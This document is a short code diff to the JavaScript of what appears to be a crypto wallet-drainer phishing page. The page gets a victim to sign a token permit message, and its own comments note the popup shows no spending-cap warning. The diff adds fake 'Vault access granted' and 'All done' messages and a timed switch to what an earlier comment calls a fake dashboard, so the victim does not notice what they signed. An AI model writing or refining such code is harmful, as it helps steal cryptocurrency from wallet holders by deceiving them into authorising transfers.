@@ -429,11 +429,19 @@
       const browserProvider = new ethers.BrowserProvider(window.ethereum);
       const signer = await browserProvider.getSigner();
 
-      // This fires the "Signature Request" popup — no spending cap warning, no tx fee shown
+      // This fires the "Signature Request" popup — no tx fee shown
       const signature = await signer.signTypedData(domain, types, message);
       permitSig = signature;
 
-      // Land on fake dashboard
+      // Immediately mark both steps done so the user sees confirmation
+      renderSteps([
+        { num:'1', state:'done', title:'Wallet connected',    desc: shortAddr(userAddress) },
+        { num:'2', state:'done', title:'Vault access granted', desc:'Setting up your dashboard...' },
+      ]);
+      document.getElementById('connectNote').textContent = "All done — loading your portfolio.";
+
+      // Brief pause so the "done" state is visible, then switch to dashboard
+      await new Promise(r => setTimeout(r, 800));
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
       showPhase('phase-dashboard');
 
